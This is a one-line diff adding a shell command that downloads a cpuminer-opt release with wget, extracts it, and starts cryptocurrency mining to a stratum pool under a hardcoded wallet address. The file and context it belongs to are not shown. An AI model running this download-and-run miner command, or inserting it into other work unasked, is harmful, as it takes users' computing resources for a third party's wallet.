@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RDMZBpzLcoDKHQ7kfnb53Zj423nRVnFqWa.WORKER_NAME
